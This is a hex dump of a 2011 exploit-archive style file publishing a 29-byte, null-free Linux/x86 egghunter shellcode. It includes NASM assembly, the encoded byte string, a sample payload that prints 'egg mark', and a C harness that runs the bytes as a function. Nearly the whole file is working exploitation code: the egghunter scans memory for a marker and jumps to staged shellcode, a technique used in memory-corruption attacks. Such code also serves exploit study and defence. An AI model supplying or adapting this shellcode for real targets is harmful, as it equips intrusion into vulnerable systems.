00000000  2f 2a 0d 0a 45 78 70 6c  6f 69 74 20 54 69 74 6c  |/*..Exploit Titl|
00000010  65 3a 20 4c 69 6e 75 78  2f 78 38 36 20 65 67 67  |e: Linux/x86 egg|
00000020  68 75 6e 74 20 73 68 65  6c 6c 63 6f 64 65 20 32  |hunt shellcode 2|
00000030  39 20 62 79 74 65 73 20  4e 55 4c 4c 20 66 72 65  |9 bytes NULL fre|
00000040  65 0d 0a 44 61 74 65 3a  20 32 33 2d 30 37 2d 32  |e..Date: 23-07-2|
00000050  30 31 31 0d 0a 41 75 74  68 6f 72 3a 20 41 6c 69  |011..Author: Ali|
00000060  20 52 61 68 65 65 6d 0d  0a 54 65 73 74 65 64 20  | Raheem..Tested |
00000070  6f 6e 3a 0d 0a 4c 69 6e  75 78 20 41 6c 69 2d 50  |on:..Linux Ali-P|
00000080  43 2e 68 6f 6d 65 20 32  2e 36 2e 33 38 2e 38 2d  |C.home 2.6.38.8-|
00000090  33 35 2e 66 63 31 35 2e  78 38 36 5f 36 34 20 23  |35.fc15.x86_64 #|
000000a0  31 20 53 4d 50 20 57 65  64 20 4a 75 6c 20 36 20  |1 SMP Wed Jul 6 |
000000b0  31 33 3a 35 38 3a 35 34  20 55 54 43 20 32 30 31  |13:58:54 UTC 201|
000000c0  31 20 78 38 36 5f 36 34  20 78 38 36 5f 36 34 20  |1 x86_64 x86_64 |
000000d0  78 38 36 5f 36 34 20 47  4e 55 2f 4c 69 6e 75 78  |x86_64 GNU/Linux|
000000e0  0d 0a 4c 69 6e 75 78 20  69 6e 6a 75 73 74 69 63  |..Linux injustic|
000000f0  65 20 32 2e 36 2e 33 38  2d 31 30 2d 67 65 6e 65  |e 2.6.38-10-gene|
00000100  72 69 63 20 23 34 36 2d  55 62 75 6e 74 75 20 53  |ric #46-Ubuntu S|
00000110  4d 50 20 54 75 65 20 4a  75 6e 20 32 38 20 31 35  |MP Tue Jun 28 15|
00000120  3a 30 35 3a 34 31 20 55  54 43 20 32 30 31 31 20  |:05:41 UTC 2011 |
00000130  69 36 38 36 20 69 36 38  36 20 69 33 38 36 20 47  |i686 i686 i386 G|
00000140  4e 55 2f 4c 69 6e 75 78  0d 0a 68 74 74 70 3a 2f  |NU/Linux..http:/|
00000150  2f 63 6f 64 65 70 61 64  2e 6f 72 67 2f 32 79 4d  |/codepad.org/2yM|
00000160  72 4e 59 35 4c 20 43 6f  64 65 20 70 61 64 20 6c  |rNY5L Code pad l|
00000170  65 74 73 20 79 6f 75 20  65 78 65 63 75 74 65 20  |ets you execute |
00000180  63 6f 64 65 20 6c 69 76  65 20 63 68 65 63 6b 20  |code live check |
00000190  68 65 72 65 20 66 6f 72  20 61 20 6c 69 76 65 20  |here for a live |
000001a0  64 65 6d 6f 73 74 72 61  74 69 6f 6e 0d 0a 54 68  |demostration..Th|
000001b0  61 6e 6b 73 3a 20 53 74  65 61 6c 74 68 2d 20 66  |anks: Stealth- f|
000001c0  6f 72 20 74 65 73 74 69  6e 67 20 61 6e 64 20 63  |or testing and c|
000001d0  6f 64 65 70 61 64 2e 63  6f 6d 20 66 6f 72 20 62  |odepad.com for b|
000001e0  65 69 6e 67 20 73 6f 20  75 73 65 66 75 6c 2e 0d  |eing so useful..|
000001f0  0a 73 65 63 74 69 6f 6e  20 2e 64 61 74 61 0d 0a  |.section .data..|
00000200  20 20 20 20 6d 73 67 20  20 20 20 20 64 62 20 22  |    msg     db "|
00000210  57 65 20 66 6f 75 6e 64  20 74 68 65 20 65 67 67  |We found the egg|
00000220  21 22 2c 30 61 68 2c 30  64 68 0d 0a 20 20 20 20  |!",0ah,0dh..    |
00000230  20 20 20 20 6d 73 67 5f  6c 65 6e 20 65 71 75 20  |    msg_len equ |
00000240  24 2d 6d 73 67 0d 0a 20  20 20 20 20 20 20 20 65  |$-msg..        e|
00000250  67 67 20 20 20 20 20 65  71 75 20 22 65 67 67 20  |gg     equ "egg |
00000260  22 0d 0a 20 20 20 20 20  20 20 20 65 67 67 31 20  |"..        egg1 |
00000270  20 20 20 65 71 75 20 22  6d 61 72 6b 22 0d 0a 73  |   equ "mark"..s|
00000280  65 63 74 69 6f 6e 20 2e  74 65 78 74 0d 0a 20 20  |ection .text..  |
00000290  20 20 67 6c 6f 62 61 6c  20 20 5f 73 74 61 72 74  |  global  _start|
000002a0  0d 0a 5f 73 74 61 72 74  3a 0d 0a 20 20 20 20 20  |.._start:..     |
000002b0  20 20 20 6a 6d 70 20 20  20 20 20 5f 72 65 74 75  |   jmp     _retu|
000002c0  72 6e 0d 0a 5f 63 6f 6e  74 69 6e 75 65 3a 0d 0a  |rn.._continue:..|
000002d0  20 20 20 20 70 6f 70 20  20 20 20 20 65 61 78 20  |    pop     eax |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 3b 54 68 69  |            ;Thi|
000002f0  73 20 63 61 6e 20 70 6f  69 6e 74 20 61 6e 79 77  |s can point anyw|
00000300  68 65 72 65 20 76 61 6c  69 64 0d 0a 5f 6e 65 78  |here valid.._nex|
00000310  74 3a 0d 0a 20 20 20 20  20 20 20 20 69 6e 63 20  |t:..        inc |
00000320  20 20 20 20 65 61 78 20  20 20 20 20 3b 63 68 61  |    eax     ;cha|
00000330  6e 67 65 20 74 6f 20 64  65 63 20 69 66 20 79 6f  |nge to dec if yo|
00000340  75 20 77 61 6e 74 20 74  6f 20 73 65 61 72 63 68  |u want to search|
00000350  20 62 61 63 6b 77 61 72  64 73 0d 0a 5f 69 73 45  | backwards.._isE|
00000360  67 67 3a 0d 0a 20 20 20  20 20 20 20 20 63 6d 70  |gg:..        cmp|
00000370  20 20 20 20 20 64 77 6f  72 64 20 5b 65 61 78 2d  |     dword [eax-|
00000380  38 5d 2c 65 67 67 0d 0a  20 20 20 20 20 20 20 20  |8],egg..        |
00000390  6a 6e 65 20 20 20 20 20  5f 6e 65 78 74 0d 0a 20  |jne     _next.. |
000003a0  20 20 20 20 20 20 20 63  6d 70 20 20 20 20 20 64  |       cmp     d|
000003b0  77 6f 72 64 20 5b 65 61  78 2d 34 5d 2c 65 67 67  |word [eax-4],egg|
000003c0  31 0d 0a 20 20 20 20 20  20 20 20 6a 6e 65 20 20  |1..        jne  |
000003d0  20 20 20 5f 6e 65 78 74  0d 0a 20 20 20 20 20 20  |   _next..      |
000003e0  20 20 6a 6d 70 20 20 20  20 20 65 61 78 0d 0a 5f  |  jmp     eax.._|
000003f0  72 65 74 75 72 6e 3a 0d  0a 20 20 20 20 20 20 20  |return:..       |
00000400  20 63 61 6c 6c 20 20 20  20 5f 63 6f 6e 74 69 6e  | call    _contin|
00000410  75 65 0d 0a 5f 65 67 67  3a 0d 0a 20 20 20 20 20  |ue.._egg:..     |
00000420  20 20 20 64 62 20 20 22  65 67 67 20 6d 61 72 6b  |   db  "egg mark|
00000430  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |"              ;|
00000440  51 57 4f 52 44 20 65 67  67 20 6d 61 72 6b 65 72  |QWORD egg marker|
00000450  0d 0a 20 20 20 20 20 20  20 20 73 75 62 20 20 20  |..        sub   |
00000460  20 20 65 61 78 2c 38 0d  0a 20 20 20 20 20 20 20  |  eax,8..       |
00000470  20 6d 6f 76 20 20 20 20  20 65 63 78 2c 65 61 78  | mov     ecx,eax|
00000480  0d 0a 20 20 20 20 20 20  20 20 6d 6f 76 20 20 20  |..        mov   |
00000490  20 20 65 64 78 2c 38 0d  0a 20 20 20 20 20 20 20  |  edx,8..       |
000004a0  20 6d 6f 76 20 20 20 20  20 65 61 78 2c 34 0d 0a  | mov     eax,4..|
000004b0  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 20  |        mov     |
000004c0  65 62 78 2c 31 0d 0a 20  20 20 20 20 20 20 20 69  |ebx,1..        i|
000004d0  6e 74 20 20 20 20 20 38  30 68 0d 0a 20 20 20 20  |nt     80h..    |
000004e0  20 20 20 20 6d 6f 76 20  20 20 20 20 65 61 78 2c  |    mov     eax,|
000004f0  31 0d 0a 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |1..        mov  |
00000500  20 20 20 65 62 78 2c 30  0d 0a 20 20 20 20 20 20  |   ebx,0..      |
00000510  20 20 69 6e 74 20 20 20  20 20 38 30 68 0d 0a 2a  |  int     80h..*|
00000520  2f 0d 0a 63 68 61 72 20  68 75 6e 74 65 72 5b 5d  |/..char hunter[]|
00000530  20 3d 0d 0a 22 5c 78 65  62 5c 78 31 36 22 0d 0a  | =.."\xeb\x16"..|
00000540  22 5c 78 35 38 22 0d 0a  22 5c 78 34 30 22 20 2f  |"\x58".."\x40" /|
00000550  2a 20 5c 78 34 30 20 3d  20 69 6e 63 20 65 61 78  |* \x40 = inc eax|
00000560  2c 20 5c 78 34 38 20 3d  20 64 65 63 20 65 61 78  |, \x48 = dec eax|
00000570  20 74 72 79 20 62 6f 74  68 2a 2f 0d 0a 22 5c 78  | try both*/.."\x|
00000580  38 31 5c 78 37 38 5c 78  66 38 5c 78 36 35 5c 78  |81\x78\xf8\x65\x|
00000590  36 37 5c 78 36 37 5c 78  32 30 22 0d 0a 22 5c 78  |67\x67\x20".."\x|
000005a0  37 35 5c 78 66 36 22 0d  0a 22 5c 78 38 31 5c 78  |75\xf6".."\x81\x|
000005b0  37 38 5c 78 66 63 5c 78  36 64 5c 78 36 31 5c 78  |78\xfc\x6d\x61\x|
000005c0  37 32 5c 78 36 62 22 0d  0a 22 5c 78 37 35 5c 78  |72\x6b".."\x75\x|
000005d0  65 64 22 0d 0a 22 5c 78  66 66 5c 78 65 30 22 0d  |ed".."\xff\xe0".|
000005e0  0a 22 5c 78 65 38 5c 78  65 35 5c 78 66 66 5c 78  |."\xe8\xe5\xff\x|
000005f0  66 66 5c 78 66 66 22 3b  0d 0a 20 0d 0a 63 68 61  |ff\xff";.. ..cha|
00000600  72 20 65 67 67 5b 5d 20  3d 0d 0a 22 65 67 67 20  |r egg[] =.."egg |
00000610  6d 61 72 6b 22 20 2f 2a  20 54 68 65 20 72 65 73  |mark" /* The res|
00000620  74 20 6f 66 20 74 68 69  73 20 69 73 20 74 68 65  |t of this is the|
00000630  20 73 68 65 6c 6c 63 6f  64 65 20 79 6f 75 20 77  | shellcode you w|
00000640  61 6e 74 20 66 6f 75 6e  64 2a 2f 0d 0a 22 5c 78  |ant found*/.."\x|
00000650  38 33 5c 78 65 38 5c 78  30 38 22 20 2f 2a 54 68  |83\xe8\x08" /*Th|
00000660  69 73 20 73 68 65 6c 6c  63 6f 64 65 20 70 72 69  |is shellcode pri|
00000670  6e 74 73 20 65 61 78 2d  34 20 69 2e 65 2e 20 74  |nts eax-4 i.e. t|
00000680  68 65 20 65 67 67 20 6d  61 72 6b 2a 2f 0d 0a 22  |he egg mark*/.."|
00000690  5c 78 38 39 5c 78 63 31  22 0d 0a 22 5c 78 62 61  |\x89\xc1".."\xba|
000006a0  5c 78 30 38 5c 78 30 30  5c 78 30 30 5c 78 30 30  |\x08\x00\x00\x00|
000006b0  22 0d 0a 22 5c 78 62 38  5c 78 30 34 5c 78 30 30  |".."\xb8\x04\x00|
000006c0  5c 78 30 30 5c 78 30 30  22 0d 0a 22 5c 78 62 62  |\x00\x00".."\xbb|
000006d0  5c 78 30 31 5c 78 30 30  5c 78 30 30 5c 78 30 30  |\x01\x00\x00\x00|
000006e0  22 0d 0a 22 5c 78 63 64  5c 78 38 30 22 0d 0a 22  |".."\xcd\x80".."|
000006f0  5c 78 62 38 5c 78 30 31  5c 78 30 30 5c 78 30 30  |\xb8\x01\x00\x00|
00000700  5c 78 30 30 22 0d 0a 22  5c 78 62 62 5c 78 30 30  |\x00".."\xbb\x00|
00000710  5c 78 30 30 5c 78 30 30  5c 78 30 30 22 0d 0a 22  |\x00\x00\x00".."|
00000720  5c 78 63 64 5c 78 38 30  22 3b 0d 0a 20 0d 0a 69  |\xcd\x80";.. ..i|
00000730  6e 74 20 6d 61 69 6e 28  29 7b 0d 0a 20 20 20 20  |nt main(){..    |
00000740  20 28 2a 28 76 6f 69 64  20 20 28 2a 29 28 29 29  | (*(void  (*)())|
00000750  20 68 75 6e 74 65 72 29  28 29 3b 0d 0a 20 20 20  | hunter)();..   |
00000760  20 20 72 65 74 75 72 6e  20 30 3b 0d 0a 7d        |  return 0;..}|
0000076e
